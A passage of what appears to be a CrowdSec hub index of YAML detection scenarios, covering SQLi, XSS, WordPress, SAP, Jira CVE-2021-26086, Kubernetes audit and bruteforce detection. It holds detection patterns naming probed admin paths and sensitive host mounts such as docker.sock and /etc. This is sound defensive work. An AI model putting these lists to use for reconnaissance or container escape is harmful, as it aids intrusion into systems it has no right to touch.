"scenarios/crowdsecurity/http-probing.yaml", "version": "0.4", "versions": {"0.1": {"digest": "580a3bcbb3756b8da7717c88708305791f39ef17c1e5c3041a1dd54b7293f57a"}, "0.2": {"digest": "c8bb45b4fb8834ea1dc5cff6439dd272c87d7ee5af4a51e77341ec6edc5d7a25"}, "0.3": {"digest": "983c356924b6e01f709b3c2d901ceb4e4ce1abe6e840048558f2824a4c4a6719"}, "0.4": {"digest": "4b16f896af400e006c28b1476bf5989c748186f2b3756ed9ad7d1559480d278c"}}}, "crowdsecurity/http-sap-interface-probing": {"content": "type: leaky\n#debug: true\nname: crowdsecurity/http-sap-interface-probing\ndescription: \"Detect generic HTTP SAP interface probing\"\nfilter: |\n  evt.Meta.service == 'http' and \n  evt.Meta.log_type in ['http_access-log', 'http_error-log'] and \n  evt.Meta.http_status in ['404', '403'] and (\n    let uri = Lower(evt.Meta.http_path);\n    uri contains \"/sap/bc/gui/sap/its/webgui\"\n    or uri contains \"/irj/portal\"\n    or uri contains \"/sap/bc/\"\n    or uri contains \"/sap/bc/ui2/flp\"\n    or uri contains \"/sap/bc/ui5_ui5/\"\n    or uri contains \"/sap/opu/odata/\"\n    or uri contains \"/sap/bc/webdynpro/\"\n    or uri contains \"/sap/public/bc/\"\n    or uri contains \"/sap/public/info\"\n    or uri contains \"/sap/public/icf_info\"\n    or uri contains \"/sap/admin/publicicp/\"\n    or uri contains \"/sap/admin/public/\"\n    or uri == \"/nwa\"\n    or uri contains \"/webdynpro/dispatcher/sap.com/tc~sec~ume~wd~umeadmin/umeadminapp\"\n    or uri contains \"/sap/hana/xs/admin\"\n    or uri contains \"/sap/hana/xs/formlogin\"\n    or uri contains \"/irj/go/km/navigation\"\n  )\ngroupby: evt.Meta.source_ip\nleakspeed: \"10s\"\ncapacity: 1\ndistinct: evt.Meta.http_path\nblackhole: 1m\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1595\n  behavior: \"http:scan\"\n  label: \"HTTP SAP Interface Probing\"\n  service: http\n  remediation: true\n", "description": "Detect generic HTTP SAP interface probing", "path": "scenarios/crowdsecurity/http-sap-interface-probing.yaml", "version": "0.1", "versions": {"0.1": {"digest": "4ba7ee33f93a8e368393deb4b7268d3e560d3e29e282b7b30fd108f59087d2f6"}}}, "crowdsecurity/http-sensitive-files": {"content": "type: leaky\nformat: 2.0\n#debug: true\nname: crowdsecurity/http-sensitive-files\ndescription: \"Detect attempt to access to sensitive files (.log, .db ..) or folders (.git)\"\nfilter: 'evt.Meta.log_type in [\"http_access-log\", \"http_error-log\"] and any(File(\"sensitive_data.txt\"), { evt.Parsed.request endsWith #})'\ngroupby: \"evt.Meta.source_ip\"\ndistinct: evt.Parsed.request\ndata:\n  - source_url: https://hub-data.crowdsec.net/web/sensitive_data.txt\n    dest_file: sensitive_data.txt\n    type: string\ncapacity: 4\nleakspeed: 5s\nblackhole: 5m\nlabels:\n  remediation: true\n  classification:\n    - attack.T1595.003\n  behavior: \"http:scan\"\n  label: \"Access to sensitive files over HTTP\"\n  spoofable: 0\n  service: http\n  confidence: 3\n", "description": "Detect attempt to access to sensitive files (.log, .db ..) or folders (.git)", "path": "scenarios/crowdsecurity/http-sensitive-files.yaml", "version": "0.4", "versions": {"0.1": {"digest": "9ed53c09709b6e9f11b52e204c8155e9a6b9db9de25686c6b1909a9c59740c5f"}, "0.2": {"digest": "3f20d74ee5b040db30743ed189537e8c43e04f8954bb5a02251a3495e7a2a555"}, "0.3": {"digest": "575087fce9fdb9351075bf563a6062fb3c5a9b35ab6844d0b2d4cc492f3497dd"}, "0.4": {"digest": "cb798582ed9a3bd090d47234bef4ca2169982c44e356e88f101ec6b6a8424676"}}}, "crowdsecurity/http-sqli-probing": {"content": "type: leaky\n#requires at least 2.0 because it's using the 'data' section and the 'Upper' expr helper\nformat: 2.0\nname: crowdsecurity/http-sqli-probbing-detection\ndata:\n  - source_url: https://hub-data.crowdsec.net/web/sqli_probe_patterns.txt\n    dest_file: sqli_probe_patterns.txt\n    type: string\ndescription: \"A scenario that detects SQL injection probing with minimal false positives\"\nfilter: \"evt.Meta.log_type in ['http_access-log', 'http_error-log'] && any(File('sqli_probe_patterns.txt'), {Upper(evt.Parsed.http_args) contains Upper(#)})\"\ngroupby: evt.Meta.source_ip\ncapacity: 10\nleakspeed: 1s\nblackhole: 5m\n#low false positives approach : we require distinct payloads to avoid false positives\ndistinct: evt.Parsed.http_args\nlabels:\n  remediation: true\n  classification:\n    - attack.T1595.002\n  behavior: \"http:exploit\"\n  label: \"SQL Injection Attempt\"\n  spoofable: 0\n  service: http\n  confidence: 3\n", "description": "A scenario that detects SQL injection probing with minimal false positives", "path": "scenarios/crowdsecurity/http-sqli-probing.yaml", "version": "0.4", "versions": {"0.1": {"digest": "f3388a2016f9a7fc48a31a357b21c8e65093b8031fc7b120ee2f020de16be246"}, "0.2": {"digest": "87683f8a569090e52fbcc6ca2ffe139658950d6a05f9d611fd13e90ab875cdb1"}, "0.3": {"digest": "5d3674a78d0dfb87d8f086f72830c61954575599883244cf23d5876954e9600c"}, "0.4": {"digest": "3dd093d823feba47a79142da4e43aab0a1249acf749c15a419f4e25f8d5bc0a2"}}}, "crowdsecurity/http-wordpress-scan": {"content": "type: leaky\nname: crowdsecurity/http-wordpress-scan\ndescription: \"Detect exploitation attempts against common WordPress endpoints\"\nfilter: |\n  evt.Meta.service == 'http' and \n  evt.Meta.log_type in ['http_access-log', 'http_error-log'] and \n  evt.Meta.http_status in ['404', '403'] and\n  Lower(evt.Meta.http_path) contains \"/wp-\" and\n  Lower(evt.Meta.http_path) endsWith \".php\"\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.http_path\ncapacity: 3\nleakspeed: \"10s\"\nblackhole: 5m\nlabels:\n  remediation: true\n  classification:\n    - attack.T1595\n  behavior: \"http:scan\"\n  label: \"WordPress Vuln Hunting\"\n  spoofable: 0\n  service: wordpress\n  confidence: 3\n", "description": "Detect exploitation attempts against common WordPress endpoints", "path": "scenarios/crowdsecurity/http-wordpress-scan.yaml", "version": "0.3", "versions": {"0.1": {"digest": "f73967711f383b190419ea877b9d45a7583591b70e81df5d0a84540a1f4367eb"}, "0.2": {"digest": "ee042ac369de1856142e19b4cdd05741644115191acbc8d54b99eb704b9aff97"}, "0.3": {"digest": "bd0b5d535f6d6e9abca866286a3a00be74c251328e254c8a59704e00bc889f72"}}}, "crowdsecurity/http-wordpress_user-enum": {"content": "type: leaky\nname: crowdsecurity/http-wordpress_user-enum\ndescription: \"Detect WordPress probing: authors enumeration\"\ndebug: false\nfilter: \"evt.Meta.log_type == 'http_access-log' && Upper(evt.Parsed.http_args) contains 'AUTHOR='\"\ngroupby: evt.Meta.source_ip\ndistinct: evt.Parsed.http_args\ncapacity: 5\nleakspeed: \"10s\"\nblackhole: 5m\nlabels:\n  remediation: true\n  classification:\n    - attack.T1589\n    - attack.T1110\n    - attack.T1595\n  behavior: \"http:scan\"\n  label: \"WordPress User Enumeration\"\n  spoofable: 0\n  service: wordpress\n  confidence: 3\n", "description": "Detect WordPress probing: authors enumeration", "path": "scenarios/crowdsecurity/http-wordpress_user-enum.yaml", "version": "0.3", "versions": {"0.1": {"digest": "b3d23b71ecb4434773e907675a1c117a97acaeeb18a9d57062bded417f18b646"}, "0.2": {"digest": "681c3829aefbbd4bf347ea85d62b4445012b276368d729114aa27bc380c801ab"}, "0.3": {"digest": "5ff256c204b5103c73b2d1b866884662531723767ec027e0d8305298fcbb1344"}}}, "crowdsecurity/http-wordpress_wpconfig": {"content": "type: leaky\nname: crowdsecurity/http-wordpress_wpconfig\ndescription: \"Detect WordPress probing: variations around wp-config.php by wpscan\"\ndebug: false\nfilter: \"evt.Meta.log_type == 'http_access-log' && evt.Parsed.file_name contains 'wp-config.php'\"\ngroupby: evt.Meta.source_ip\ndistinct: evt.Parsed.file_name\ncapacity: 5\nleakspeed: \"10s\"\nblackhole: 5m\nlabels:\n  remediation: true\n  classification:\n    - attack.T1595\n  behavior: \"http:scan\"\n  label: \"Access to WordPress wp-config.php\"\n  spoofable: 0\n  confidence: 3\n  service: wordpress\n", "description": "Detect WordPress probing: variations around wp-config.php by wpscan", "path": "scenarios/crowdsecurity/http-wordpress_wpconfig.yaml", "version": "0.3", "versions": {"0.1": {"digest": "ff3876c1f9828052ba633264920100aa49402ab3e41a9cb73d28853d248a6d98"}, "0.2": {"digest": "0d45562d1540796a109c8e986f2d0c79ce312f0d7547134ac449cf24c5934cb5"}, "0.3": {"digest": "d9544672ddf4808450ce95dfbd9f5e9bd470c08d14c3571a4e38ab5135a5bec9"}}}, "crowdsecurity/http-xss-probing": {"content": "type: leaky\n#requires at least 2.0 because it's using the 'data' section and the 'Upper' expr helper\nformat: 2.0\nname: crowdsecurity/http-xss-probbing\ndata:\n  - source_url: https://hub-data.crowdsec.net/web/xss_probe_patterns.txt\n    dest_file: xss_probe_patterns.txt\n    type: string\ndescription: \"A scenario that detects XSS probing with minimal false positives\"\nfilter: \"evt.Meta.log_type in ['http_access-log', 'http_error-log'] && any(File('xss_probe_patterns.txt'), {Upper(evt.Parsed.http_args) contains Upper(#)})\"\ngroupby: evt.Meta.source_ip\ncapacity: 5\nleakspeed: 1s\nblackhole: 5m\n#low false positives approach : we require distinct payloads to avoid false positives\ndistinct: evt.Parsed.http_args\nlabels:\n  remediation: true\n  classification:\n    - attack.T1595.002\n  behavior: \"http:exploit\"\n  label: \"XSS Attempt\"\n  spoofable: 0\n  service: http\n  confidence: 3\n", "description": "A scenario that detects XSS probing with minimal false positives", "path": "scenarios/crowdsecurity/http-xss-probing.yaml", "version": "0.4", "versions": {"0.1": {"digest": "8d6f0d6f9dc48f8f5ad561a2cdb315e499539b3575f259e0d6cf5850ef1efc9e"}, "0.2": {"digest": "1c4d58e1a29cf806a92f67c981532f8a4656312abd05697dcc69b59b757f0076"}, "0.3": {"digest": "c16d275e5e3bedd452be87f48aa52c6e8250211e8c205e96d653c8cc9032c44f"}, "0.4": {"digest": "bc9a433be5dd82c03b92f7de826bd1bbc40649807ce1e2143607f924fcbb2d8e"}}}, "crowdsecurity/impossible-travel": {"content": "## Generic bucket to handle impossible travel for authentication\ntype: conditional\nname: crowdsecurity/impossible-travel\ndescription: \"Detect Impossible Travel\"\nfilter: \"evt.Meta.log_type == 'auth_success' && evt.Meta.user not in ['', nil]\"\ngroupby: \"evt.Meta.service + evt.Meta.user\"\n# To make it generic we concatenate the service name and the user\ncapacity: -1\ncondition: |\n    len(queue.Queue) >= 2 \n    and Distance(queue.Queue[-1].Enriched.Latitude, queue.Queue[-1].Enriched.Longitude,\n    queue.Queue[-2].Enriched.Latitude, queue.Queue[-2].Enriched.Longitude) > 1000\nleakspeed: 3h\nlabels:\n  remediation: false\n  classification:\n    - attack.T1078\n  behavior: \"auth:successful\"\n  label: \"Impossible travel\"\n  spoofable: 0\n  service: authentication\n  confidence: 3", "description": "Detect Impossible Travel", "path": "scenarios/crowdsecurity/impossible-travel.yaml", "version": "0.2", "versions": {"0.1": {"digest": "9f25e866bd1bd232b68e9533cf60d85cd852bac91ec325978e3e9ebd81b4c3f7"}, "0.2": {"digest": "e7dc7372fd0b5c47df7712228ee252b3c97968cd2448c4b136f160a998393b18"}}}, "crowdsecurity/impossible-travel-user": {"content": "## Generic bucket to handle impossible travel for authentication with username scope\ntype: conditional\nname: crowdsecurity/impossible-travel-user\ndescription: \"impossible travel user\"\nfilter: \"evt.Meta.log_type == 'auth_success' && evt.Meta.user not in ['', nil]\"\ngroupby: \"evt.Meta.service + evt.Meta.user\"\n# To make it generic we concatenate the service name and the user\ncapacity: -1\ncondition: |\n    len(queue.Queue) >= 2 \n    and Distance(queue.Queue[-1].Enriched.Latitude, queue.Queue[-1].Enriched.Longitude,\n    queue.Queue[-2].Enriched.Latitude, queue.Queue[-2].Enriched.Longitude) > 1000\nleakspeed: 3h\nscope:\n    type: username\n    expression: evt.Meta.user\nlabels:\n  remediation: false\n  classification:\n    - attack.T1078\n  behavior: \"auth:successful\"\n  label: \"Impossible travel\"\n  spoofable: 0\n  service: authentication\n  confidence: 3", "description": "impossible travel user", "path": "scenarios/crowdsecurity/impossible-travel-user.yaml", "version": "0.1", "versions": {"0.1": {"digest": "806f37a192e70eec9b8c6437fe39047651c47f35d16df59cf687dedb8133778c"}}}, "crowdsecurity/iptables-scan-multi_ports": {"content": "type: leaky\nname: crowdsecurity/iptables-scan-multi_ports\ndescription: \"Detect aggressive portscans\"\nfilter: \"evt.Meta.log_type == 'iptables_drop' && evt.Meta.service == 'tcp'\"\ngroupby: evt.Meta.source_ip\ndistinct: evt.Parsed.dst_port\ncapacity: 15\nleakspeed: 5s\nblackhole: 1m\nlabels:\n  remediation: true\n  classification:\n    - attack.T1595.001\n    - attack.T1018\n    - attack.T1046\n  behavior: \"tcp:scan\"\n  label: \"TCP Port Scan\"\n  spoofable: 3\n  confidence: 1\n", "description": "Detect aggressive portscans", "path": "scenarios/crowdsecurity/iptables-scan-multi_ports.yaml", "version": "0.3", "versions": {"0.1": {"digest": "85bd908ec6efae802035e4553f5dd41e4d5b6b53b2f237dd256533965bd44cd7"}, "0.2": {"digest": "af7ec1e0af8a778d80f6de3c8d28c15fdce53882e7cd5c8e3291e397b6ac4985"}, "0.3": {"digest": "81fc1dfd47c1b2ee6874af937e6755fbe80930cf4733b8fa2cb5c5cb031ba3b6"}}}, "crowdsecurity/jira_cve-2021-26086": {"content": "type: trigger\nformat: 2.0\n#debug: true\nname: crowdsecurity/jira_cve-2021-26086\ndescription: \"Detect Atlassian Jira CVE-2021-26086 exploitation attemps\"\nfilter: |\n  evt.Meta.log_type in [\"http_access-log\", \"http_error-log\"] and any(File(\"jira_cve_2021-26086.txt\"), {Upper(evt.Meta.http_path) contains Upper(#)})\ndata:\n  - source_url: https://hub-data.crowdsec.net/web/jira_cve_2021-26086.txt\n    dest_file: jira_cve_2021-26086.txt\n    type: string\ngroupby: \"evt.Meta.source_ip\"\nblackhole: 2m\nlabels:\n  remediation: true\n  classification:\n    - attack.T1595.001\n    - attack.T1190\n    - cve.CVE-2021-26086\n  behavior: \"http:exploit\"\n  label: \"Jira CVE-2021-26086 exploitation\"\n  spoofable: 0\n  service: jira\n  confidence: 3\n", "description": "Detect Atlassian Jira CVE-2021-26086 exploitation attemps", "path": "scenarios/crowdsecurity/jira_cve-2021-26086.yaml", "version": "0.3", "versions": {"0.1": {"digest": "1c3631aaa5818cb3af51e6ca6d4fe270eeb362d1ea0dd3fa19c735f3671253d5"}, "0.2": {"digest": "d5fef0d96708e47793854ac57ea135bed7801fc85c85f59b0e6ba95b93b3049b"}, "0.3": {"digest": "b2cf725a3483845be22475b6f7556dd50e96199407eee077da49f7bff04f1b0a"}}}, "crowdsecurity/k8s-audit-anonymous-access": {"content": "type: trigger\nname: crowdsecurity/k8s-audit-anonymous-access\ndescription: \"Detect allowed anonymous access to the K8S API\"\nfilter: |\n   evt.Meta.log_type == 'k8s-audit' &&\n   (\n    (evt.Meta.datasource_type == \"k8s-audit\" && evt.Unmarshaled.k8s_audit.ObjectRef?.Resource not in [\"healthz\", \"livez\", \"readyz\"]) \n    || \n    (evt.Meta.datasource_type != \"k8s-audit\" && evt.Unmarshaled.k8s_audit.objectRef?.resource not in [\"healthz\", \"livez\", \"readyz\"])\n   )\n   && evt.Meta.user in [\"system:anonymous\", \"system:unauthenticated\"]\nlabels:\n   notification: true\n   classification:\n      - attack.T1595\n   behavior: \"k8s:scan\"\n   label: \"Kubernetes API anonymous access\"\n   spoofable: 0\n   service: k8s\n   confidence: 3\n", "description": "Detect allowed anonymous access to the K8S API", "path": "scenarios/crowdsecurity/k8s-audit-anonymous-access.yaml", "version": "0.4", "versions": {"0.1": {"digest": "d554b9a458ed4edf24a67f1bdf13b32e2ddb43f7ff7b2675c706f0fa2b47ebf5"}, "0.2": {"digest": "0a00e1d0df5950c4a88c9e8ee71a0069a808691b1091d9c2dad3d29d20c7e308"}, "0.3": {"digest": "2c3f6ef71eff02540727a872fa4f5cf7abd2271bb3bbd970b65de810b0894a71"}, "0.4": {"digest": "e5c03d518fc4133ed7a48a533a56cafb92aa6893e259f155f517963b239ab471"}}}, "crowdsecurity/k8s-audit-api-server-bruteforce": {"content": "type: leaky\nname: crowdsecurity/k8s-audit-api-server-bruteforce\ndescription: \"Detect bruteforce attempts against K8S API server\"\nfilter: |\n  evt.Meta.log_type == 'k8s-audit' && \n  (\n   (evt.Meta.datasource_type == \"k8s-audit\" && evt.Unmarshaled.k8s_audit.ResponseStatus.code in [401, 403])\n   ||\n   (evt.Meta.datasource_type != \"k8s-audit\" && evt.Unmarshaled.k8s_audit.responseStatus.code in [401, 403])\n  )\nleakspeed: \"10s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: true\nlabels:\n  remediation: true\n  classification:\n    - attack.T1110\n  behavior: \"k8s:bruteforce\"\n  label: \"Kubernetes API Bruteforce\"\n  spoofable: 0\n  confidence: 3\n  service: k8s\n", "description": "Detect bruteforce attempts against K8S API server", "path": "scenarios/crowdsecurity/k8s-audit-api-server-bruteforce.yaml", "version": "0.4", "versions": {"0.1": {"digest": "7ecb56f49b3fca372837c619a85b930b85905a318f9ab96a81a7b7f0e154720a"}, "0.2": {"digest": "3794908e15dcd43bed1e23946a14e13afb67c8a067819bd53b4076394071ae7a"}, "0.3": {"digest": "c134ab48fbb7e97cf523733b3086da1bc08c1b020555e0ec1ccca4fff6adef04"}, "0.4": {"digest": "16f47cfcf58ab606ac40b384d8b8b0e26d937d27031e3247c700ecbedc06b7d0"}}}, "crowdsecurity/k8s-audit-pod-exec": {"content": "type: trigger\nname: crowdsecurity/k8s-audit-pod-exec\ndescription: \"Detect execution (via kubectl exec) in pods\"\nfilter: |\n  evt.Meta.log_type == 'k8s-audit' &&\n  (\n   (evt.Meta.datasource_type == \"k8s-audit\" && evt.Unmarshaled.k8s_audit.ObjectRef?.Resource == 'pods' && evt.Unmarshaled.k8s_audit.ObjectRef?.Subresource == 'exec')\n   ||\n   (evt.Meta.datasource_type != \"k8s-audit\" && evt.Unmarshaled.k8s_audit.objectRef?.resource == 'pods' && evt.Unmarshaled.k8s_audit.objectRef?.subresource == 'exec')\n  )\nlabels:\n  notification: true\n  classification:\n    - attack.T1609\n  behavior: \"k8s:audit\"\n  label: \"Kubernetes Exec Into Pod\"\n  spoofable: 0\n  confidence: 3\n  cti: false\n  service: k8s\n", "description": "Detect execution (via kubectl exec) in pods", "path": "scenarios/crowdsecurity/k8s-audit-pod-exec.yaml", "version": "0.4", "versions": {"0.1": {"digest": "da4d3286064bc873a090205cae1274e96eb9338794ecf7bebe5b7186d11d3907"}, "0.2": {"digest": "4d14afcd01ba3c46f873afb7898202875eec675863d0da5c35c79341f164c4ed"}, "0.3": {"digest": "b5047e4cc82051818b47fdbbe3803c7fabdb91b91318e990692760c2034a61c6"}, "0.4": {"digest": "2c7bc8d2ff7d50616d7e29955a34ddd1fd05410b75965384f9c1698ef4eced9b"}}}, "crowdsecurity/k8s-audit-pod-host-network": {"content": "type: trigger\nname: crowdsecurity/k8s-audit-pod-host-network\ndescription: \"Detect pods started with host networking\"\nfilter: |\n  evt.Meta.log_type == 'k8s-audit' &&\n  (\n   (evt.Meta.datasource_type == \"k8s-audit\" && evt.Unmarshaled.k8s_audit.Verb == 'create' && evt.Unmarshaled.k8s_audit.ObjectRef?.Resource == 'pods' && evt.Unmarshaled.k8s_audit.RequestObject?.spec?.hostNetwork == true)\n   ||\n   (evt.Meta.datasource_type != \"k8s-audit\" && evt.Unmarshaled.k8s_audit.verb == 'create' && evt.Unmarshaled.k8s_audit.objectRef?.resource == 'pods' && evt.Unmarshaled.k8s_audit.requestObject?.spec?.hostNetwork == true)\n  )\nlabels:\n  notification: true\n  classification:\n    - attack.T1610\n  behavior: \"k8s:audit\"\n  label: \"Kubernetes Pod Start With Host Networking\"\n  spoofable: 0\n  confidence: 3\n  service: k8s\n", "description": "Detect pods started with host networking", "path": "scenarios/crowdsecurity/k8s-audit-pod-host-network.yaml", "version": "0.4", "versions": {"0.1": {"digest": "22c8869a8472b15bbdef04b4c9a0a30ee8479e909df4b7672515f009ea23b28c"}, "0.2": {"digest": "13e46cb544153327e7cd2057e9b1005b409172b3b3e61f1b831abaf025976a23"}, "0.3": {"digest": "5162f7a8153ba082f0a67e14fa51cce45755a0d4a1d135cebd6af031609b8808"}, "0.4": {"digest": "23bf720e5426846200e199b9e21ff9825ee923d985079c1c7bb799275f3dd768"}}}, "crowdsecurity/k8s-audit-pod-host-path-volume": {"content": "type: trigger\nname: crowdsecurity/k8s-audit-pod-host-path-volume\ndescription: \"Detect pods mounting a sensitive host folder\"\nfilter: |\n  evt.Meta.log_type == 'k8s-audit' &&\n  (\n   (\n    evt.Meta.datasource_type == \"k8s-audit\" &&\n    evt.Unmarshaled.k8s_audit.ObjectRef?.Resource == 'pods' &&\n    evt.Unmarshaled.k8s_audit.RequestObject != nil &&\n    evt.Unmarshaled.k8s_audit.RequestObject.spec != nil &&\n    evt.Unmarshaled.k8s_audit.RequestObject.spec.volumes != nil &&\n    any(evt.Unmarshaled.k8s_audit.RequestObject.spec.volumes, { .hostPath != nil && .hostPath.path in [\"/proc\", \"/var/run/docker.sock\", \"/\", \"/etc\", \"/root\", \"/var/run/crio/crio.sock\", \"/home/admin\", \"/var/lib/kubelet\", \"/var/lib/kubelet/pki\", \"/etc/kubernetes\", \"/etc/kubernetes/manifests\"] })\n   )\n   ||\n   (\n    evt.Meta.datasource_type != \"k8s-audit\" &&\n    evt.Unmarshaled.k8s_audit.objectRef?.resource == 'pods' &&\n    evt.Unmarshaled.k8s_audit.requestObject != nil &&\n    evt.Unmarshaled.k8s_audit.requestObject.spec != nil &&\n    evt.Unmarshaled.k8s_audit.requestObject.spec.volumes != nil &&\n    any(evt.Unmarshaled.k8s_audit.requestObject.spec.volumes, { .hostPath != nil && .hostPath.path in [\"/proc\", \"/var/run/docker.sock\", \"/\", \"/etc\", \"/root\", \"/var/run/crio/crio.sock\", \"/home/admin\", \"/var/lib/kubelet\", \"/var/lib/kubelet/pki\", \"/etc/kubernetes\", \"/etc/kubernetes/manifests\"] })\n   )\n  )\nlabels:\n  notification: true\n  classification:\n    - attack.T1610\n  behavior: \"k8s:audit\"\n  label: \"Kubernetes Pod Start With Host Path\"\n  spoofable: 0\n  confidence: 3\n  service: k8s\n", "description": "Detect pods mounting a sensitive host folder", "path": "scenarios/crowdsecurity/k8s-audit-pod-host-path-volume.yaml", "version": "0.5", "versions": {"0.1": {"digest": "a2cfbc902f353f46fa5d7a38565e2aebdf0c74ffc3ee1dc285331b93ad1989ef"}, "0.2": {"digest": "7a0f0c5fdaf46513bdbc858e30628e5ca16f36bf81352914b5d9ccbdea7564af"}, "0.3": {"digest": "b596e6047525ef0ed7377c829010b6605faa3ea32da227f55e5e5a15f2057032"}, "0.4": {"digest": "28bcdb0dc2e8303e445dadb0e1ea57a41bde1d7a57b98d9b70491b7af1d6f67e"}, "0.5": {"digest": "063db67636d42747f4c305984612ceccc9c427c278223d83c05bcf310f6416d8"}}}, "crowdsecurity/k8s-audit-privileged-pod-creation": {"content": "type: trigger\nname: crowdsecurity/k8s-audit-privileged-pod-creation\ndescription: \"Detect privileged pod creation\"\nfilter: |\n  evt.Meta.log_type == 'k8s-audit' &&\n  (\n   (\n    evt.Meta.datasource_type == \"k8s-audit\" &&\n    evt.Unmarshaled.k8s_audit.Verb == 'create' &&\n    evt.Unmarshaled.k8s_audit.ObjectRef?.Resource == 'pods' &&\n    evt.Unmarshaled.k8s_audit.RequestObject != nil &&\n    evt.Unmarshaled.k8s_audit.RequestObject.spec != nil &&\n    any(evt.Unmarshaled.k8s_audit.RequestObject.spec.containers, { .securityContext != nil && .securityContext.privileged == true })\n   )\n   ||\n   (\n    evt.Meta.datasource_type != \"k8s-audit\" &&\n    evt.Unmarshaled.k8s_audit.verb == 'create' &&\n    evt.Unmarshaled.k8s_audit.objectRef?.resource == 'pods' &&\n    evt.Unmarshaled.k8s_audit.requestObject != nil &&\n    evt.Unmarshaled.k8s_audit.requestObject.spec != nil &&\n    any(evt.Unmarshaled.k8s_audit.requestObject.spec.containers, { .securityContext != nil && .securityContext.privileged == true })\n   )\n  )\nlabels:\n  notification: true\n  classification:\n    - attack.T1610\n  behavior: \"k8s:audit\"\n  label: \"Kubernetes Privileged Pod Creation\"\n  spoofable: 0\n  confidence: 3\n  service: k8s\n", "description": "Detect privileged pod creation", "path": "scenarios/crowdsecurity/k8s-audit-privileged-pod-creation.yaml", "version": "0.4", "versions": {"0.1": {"digest": "ba074de3c2dc77cb50b5bdf84bcc764750cd9166b279c4ac5f1e15ab01eb4308"}, "0.2": {"digest": "cb38d6ab6abbea0bf3a0f8471fa88e175d3bafbbe808f17274bfbac8b464bbf0"}, "0.3": {"digest": "8350fe7aeff51b0167aaba17591008942bdeeb6c8183765bd110a657d0e27f24"}, "0.4": {"digest": "becd28f2a57949a529076a5800edca5cb54c4e4adb457ba43d9232659df3845b"}}}, "crowdsecurity/k8s-audit-service-account-access-denied": {"content": "type: trigger\nname: crowdsecurity/k8s-audit-service-account-access-denied\ndescription: \"Detect unauthorized requests from service accounts\"\nfilter: |\n  evt.Meta.log_type == 'k8s-audit' &&\n  evt.Meta.user startsWith \"system:serviceaccount:\" &&\n  (\n   (evt.Meta.datasource_type == \"k8s-audit\" && evt.Unmarshaled.k8s_audit.Annotations[\"authorization.k8s.io/decision\"] == \"forbid\")\n   ||\n   (evt.Meta.datasource_type != \"k8s-audit\" && evt.Unmarshaled.k8s_audit.annotations[\"authorization.k8s.io/decision\"] == \"forbid\")\n  )\nlabels:\n  notification: true\n  classification:\n    - attack.T1078\n    - attack.T1069\n  behavior: \"k8s:scan\"\n  label: \"Kubernetes Service Account Denied Request\"\n  spoofable: 0\n  confidence: 3\n  service: k8s\n", "description": "Detect unauthorized requests from service accounts", "path": "scenarios/crowdsecurity/k8s-audit-service-account-access-denied.yaml", "version": "0.4", "versions": {"0.1": {"digest": "b43903791497159fe0dbe5da4aa53275ec41d92eecf6b77318e5f75ae2bf8770"}, "0.2": {"digest": "4c34c562c8a837a1fa32e23dafc4182d371c3576266e206404974421eb13e5a9"}, "0.3": {"digest": "f60ca3ffd290bc64f66c86eb5325b3fe418b884230b38ece451ee5d0dad919f3"}, "0.4": {"digest": "e9532021eea1cb008a0307455aba3d42e537ac043bbcb8583f1dd2e563820fdb"}}}, "crowdsecurity/kasm-bruteforce": {"content": "type: leaky\nname: crowdsecurity/kasm-bruteforce\ndescription: \"Detect kasm login bruteforce\"\nfilter: \"evt.Meta.metric_name in ['account.login.failed_invalid_user', 'account.login.failed_invalid_password']\"\nleakspeed: \"10s\"\ncapacity: 3\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: true\nlabels:\n  remediation: true\n  classification:\n    - attack.T1110\n  behavior: \"generic:bruteforce\"\n  label: \"KASM Bruteforce\"\n  spoofable: 0\n  confidence: 3\n  service: kasm\n", "description": "Detect kasm login bruteforce", "path": "scenarios/crowdsecurity/kasm-bruteforce.yaml", "version": "0.2", "versions": {"0.1": {"digest": "5f4464d3102dc48cb57695252d7352ab305c6f5fd50aa1e275de28030315fa63"}, "0.2": {"digest": "11ae6e8e7e60c5efcfe523ea4ea357168d29e5024b28d1e0396e1e7a37cf9223"}}}, "crowdsecurity/litespeed-admin-bf": {"content": "type: leaky\nname: crowdsecurity/litespeed-admin-bf\ndescription: \"Detect bruteforce against litespeed admin UI\"\nfilter: \"evt.Meta.service == 'http' && evt.Meta.sub_type == 'litespeed_admin_auth_fail'\"\ngroupby: evt.Meta.source_ip\ncapacity: 5\nleakspeed: \"10s\"\nblackhole: 1m\nlabels:\n  remediation: true\n  classification:\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"LiteSpeed Admin Bruteforce\"\n  spoofable: 0\n  confidence: 3\n  service: litespeed\n", "description": "Detect bruteforce against litespeed admin UI", "path": "scenarios/crowdsecurity/litespeed-admin-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "cf7a11ef6d75de569bdd3e0d62a805a7793102e57911a1a6256327da64aed692"}, "0.2": {"digest": "456850e8d43f06d882e59991f0721d28f6c80220df0b80c17306e735587f1f36"}}}, "crowdsecurity/mariadb-bf": {"content": "# mariadb bruteforce\ntype: leaky\n#debug: true\nname: crowdsecurity/mariadb-bf\ndescription: \"Detect mariadb bruteforce\"\nfilter: evt.Meta.log_type == 'mariadb_failed_auth'\nleakspeed: \"10s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n  remediation: true\n  service: mariadb\n  classification:\n    - attack.T1110\n  behavior: \"database:bruteforce\"\n  label: \"MariaDB Bruteforce\"\n  spoofable: 0\n  confidence: 3\n", "description": "Detect mariadb bruteforce", "path": "scenarios/crowdsecurity/mariadb-bf.yaml", "version": "0.2", "versions": {"0.1": {"digest": "c6daa770b5ac5f153e6b5bc0c2eb8e50f90373e1802bea40724ebe6037a15ab4"}, "0.2": {"digest": "09b4708abcf47bc810fd74d8c8d1395bc5dbb732184a8231c4dda4b587da2575"}}}, "crowdsecurity/modsecurity": {"content": "type: trigger\n#debug: true\nname: crowdsecurity/modsecurity\ndescription: \"Web exploitation via modsecurity\"\n#modsec for nginx only logs the numerical value of the severity\nfilter: evt.Meta.log_type == 'modsecurity' && (evt.Parsed.ruleseverity == 'CRITICAL' || evt.Parsed.ruleseverity == '2')\nblackhole: 2m\ngroupby: evt.Meta.source_ip\nlabels:\n  remediation: true\n  classification:\n    - attack.T1595\n    - attack.T1190\n  behavior: \"http:exploit\"\n  label: \"Modsecurity Alert\"\n  